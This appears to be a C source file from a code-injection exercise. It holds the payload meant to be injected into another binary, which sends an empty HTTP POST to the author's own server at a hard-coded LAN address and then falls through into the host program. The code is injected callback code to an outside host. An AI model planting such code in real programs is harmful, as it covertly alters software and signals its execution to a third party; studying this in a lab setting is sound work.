#include <unistd.h> // read, write, close
#include <sys/socket.h> // socket, connect */
#include <netinet/in.h> // struct sockaddr_in

/**
 * This file contains the c-code of the injected code. The client makes an HTTP POST request (with an empty body) to my web server. 
 * This file as well as the equivalent assembly code contains labels and goto statements in case of errors with one of the library functions
 * it will continue to run into the code for the injected file without exiting.
 * The injected assembly code does not contain library functions; it contains the necessary code for these functions instead.
 * Adopted from StackOverflow: https://stackoverflow.com/questions/22077802/simple-c-example-of-doing-an-http-post-and-consuming-the-response
*/

int main()
{
    //Post request
    char message[44] = "POST /code-injection/timestamps HTTP/1.0\r\n\r\n";

    struct sockaddr_in serv_addr;
    int sockfd, bytes, sent, received, total;
    char response[4096];

    /* create the socket */
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) goto end;

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = 0x5000; // Port 80 in little endian
    serv_addr.sin_addr.s_addr = 0x7E01A8C0;//IP Addresss of server in little endian

    // connect the socket 
    if (connect(sockfd,(struct sockaddr *)&serv_addr,sizeof(serv_addr)) < 0) goto socket;

    // send the request 
    sent = 0;
    do {
        bytes = write(sockfd,message+sent,44-sent);
        if (bytes < 0) goto socket;
        if (bytes == 0)
            break;
        sent+=bytes;
    } while (sent < 44);

    // receive the response 
    total = sizeof(response)-1;
    received = 0;
    do {
        bytes = read(sockfd,response+received,total-received);
        if (bytes < 0) goto socket;
        if (bytes == 0)
            break;
        received+=bytes;
    } while (received < total);

    socket:
    // close the socket
    close(sockfd);
    end:

    return 0;
}